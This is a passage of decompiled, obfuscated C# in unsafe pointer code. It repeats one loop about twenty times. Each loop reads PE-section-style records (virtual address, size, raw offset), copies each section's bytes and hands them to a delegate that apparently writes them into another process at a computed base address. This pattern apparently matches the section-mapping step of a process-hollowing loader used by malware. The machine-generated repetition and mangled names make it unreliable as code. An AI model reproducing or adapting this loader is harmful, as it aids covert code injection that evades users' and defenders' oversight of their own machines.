						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4392] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4392] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 3168)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 3172)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 3176)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4390] = ((*(int*)((byte*)ptr + 3172) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4390] != 0)
					{
						byte[] array263;
						checked
						{
							array263 = new byte[*unchecked((int*)((byte*)ptr + 3172)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 3176), array263, 0, array263.Length);
						((byte*)ptr)[4391] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 3168))), array263, array263.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4391] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4395] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4395] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 3180)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 3184)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 3188)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4393] = ((*(int*)((byte*)ptr + 3184) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4393] != 0)
					{
						byte[] array264;
						checked
						{
							array264 = new byte[*unchecked((int*)((byte*)ptr + 3184)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 3188), array264, 0, array264.Length);
						((byte*)ptr)[4394] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 3180))), array264, array264.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4394] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4398] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4398] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 3192)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 3196)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 3200)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4396] = ((*(int*)((byte*)ptr + 3196) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4396] != 0)
					{
						byte[] array265;
						checked
						{
							array265 = new byte[*unchecked((int*)((byte*)ptr + 3196)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 3200), array265, 0, array265.Length);
						((byte*)ptr)[4397] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 3192))), array265, array265.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4397] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4401] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4401] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 3204)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 3208)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 3212)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4399] = ((*(int*)((byte*)ptr + 3208) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4399] != 0)
					{
						byte[] array266;
						checked
						{
							array266 = new byte[*unchecked((int*)((byte*)ptr + 3208)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 3212), array266, 0, array266.Length);
						((byte*)ptr)[4400] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 3204))), array266, array266.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4400] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4404] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4404] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 3216)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 3220)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 3224)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4402] = ((*(int*)((byte*)ptr + 3220) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4402] != 0)
					{
						byte[] array267;
						checked
						{
							array267 = new byte[*unchecked((int*)((byte*)ptr + 3220)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 3224), array267, 0, array267.Length);
						((byte*)ptr)[4403] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 3216))), array267, array267.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4403] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4407] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4407] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 3228)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 3232)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 3236)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4405] = ((*(int*)((byte*)ptr + 3232) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4405] != 0)
					{
						byte[] array268;
						checked
						{
							array268 = new byte[*unchecked((int*)((byte*)ptr + 3232)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 3236), array268, 0, array268.Length);
						((byte*)ptr)[4406] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 3228))), array268, array268.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4406] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4410] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4410] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 3240)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 3244)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 3248)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4408] = ((*(int*)((byte*)ptr + 3244) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4408] != 0)
					{
						byte[] array269;
						checked
						{
							array269 = new byte[*unchecked((int*)((byte*)ptr + 3244)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 3248), array269, 0, array269.Length);
						((byte*)ptr)[4409] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 3240))), array269, array269.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4409] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4413] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4413] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 3252)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 3256)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 3260)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4411] = ((*(int*)((byte*)ptr + 3256) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4411] != 0)
					{
						byte[] array270;
						checked
						{
							array270 = new byte[*unchecked((int*)((byte*)ptr + 3256)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 3260), array270, 0, array270.Length);
						((byte*)ptr)[4412] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 3252))), array270, array270.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4412] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4416] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4416] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 3264)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 3268)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 3272)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4414] = ((*(int*)((byte*)ptr + 3268) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4414] != 0)
					{
						byte[] array271;
						checked
						{
							array271 = new byte[*unchecked((int*)((byte*)ptr + 3268)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 3272), array271, 0, array271.Length);
						((byte*)ptr)[4415] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 3264))), array271, array271.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4415] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4419] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4419] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 3276)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 3280)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 3284)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4417] = ((*(int*)((byte*)ptr + 3280) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4417] != 0)
					{
						byte[] array272;
						checked
						{
							array272 = new byte[*unchecked((int*)((byte*)ptr + 3280)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 3284), array272, 0, array272.Length);
						((byte*)ptr)[4418] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 3276))), array272, array272.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4418] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4422] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4422] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 3288)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 3292)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 3296)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4420] = ((*(int*)((byte*)ptr + 3292) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4420] != 0)
					{
						byte[] array273;
						checked
						{
							array273 = new byte[*unchecked((int*)((byte*)ptr + 3292)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 3296), array273, 0, array273.Length);
						((byte*)ptr)[4421] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 3288))), array273, array273.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4421] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4425] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4425] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 3300)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 3304)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 3308)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4423] = ((*(int*)((byte*)ptr + 3304) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4423] != 0)
					{
						byte[] array274;
						checked
						{
							array274 = new byte[*unchecked((int*)((byte*)ptr + 3304)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 3308), array274, 0, array274.Length);
						((byte*)ptr)[4424] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 3300))), array274, array274.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4424] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4428] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4428] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 3312)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 3316)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 3320)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4426] = ((*(int*)((byte*)ptr + 3316) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4426] != 0)
					{
						byte[] array275;
						checked
						{
							array275 = new byte[*unchecked((int*)((byte*)ptr + 3316)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 3320), array275, 0, array275.Length);
						((byte*)ptr)[4427] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 3312))), array275, array275.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4427] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4431] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4431] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 3324)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 3328)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 3332)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4429] = ((*(int*)((byte*)ptr + 3328) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4429] != 0)
					{
						byte[] array276;
						checked
						{
							array276 = new byte[*unchecked((int*)((byte*)ptr + 3328)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 3332), array276, 0, array276.Length);
						((byte*)ptr)[4430] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 3324))), array276, array276.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4430] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4434] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4434] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 3336)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 3340)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 3344)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4432] = ((*(int*)((byte*)ptr + 3340) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4432] != 0)
					{
						byte[] array277;
						checked
						{
							array277 = new byte[*unchecked((int*)((byte*)ptr + 3340)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 3344), array277, 0, array277.Length);
						((byte*)ptr)[4433] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 3336))), array277, array277.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4433] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4437] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4437] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 3348)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 3352)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 3356)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4435] = ((*(int*)((byte*)ptr + 3352) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4435] != 0)
					{
						byte[] array278;
						checked
						{
							array278 = new byte[*unchecked((int*)((byte*)ptr + 3352)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 3356), array278, 0, array278.Length);
						((byte*)ptr)[4436] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 3348))), array278, array278.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4436] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4440] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4440] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 3360)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 3364)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 3368)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4438] = ((*(int*)((byte*)ptr + 3364) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4438] != 0)
					{
						byte[] array279;
						checked
						{
							array279 = new byte[*unchecked((int*)((byte*)ptr + 3364)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 3368), array279, 0, array279.Length);
						((byte*)ptr)[4439] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 3360))), array279, array279.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4439] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4443] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4443] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 3372)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 3376)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 3380)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4441] = ((*(int*)((byte*)ptr + 3376) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4441] != 0)
					{
						byte[] array280;
						checked
						{
							array280 = new byte[*unchecked((int*)((byte*)ptr + 3376)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 3380), array280, 0, array280.Length);
						((byte*)ptr)[4442] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 3372))), array280, array280.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4442] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4446] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4446] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 3384)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 3388)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 3392)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4444] = ((*(int*)((byte*)ptr + 3388) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4444] != 0)
					{
						byte[] array281;
						checked
						{
							array281 = new byte[*unchecked((int*)((byte*)ptr + 3388)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 3392), array281, 0, array281.Length);
						((byte*)ptr)[4445] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 3384))), array281, array281.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4445] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4449] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4449] == 0)
					{
						break;
					}
					checked
					{
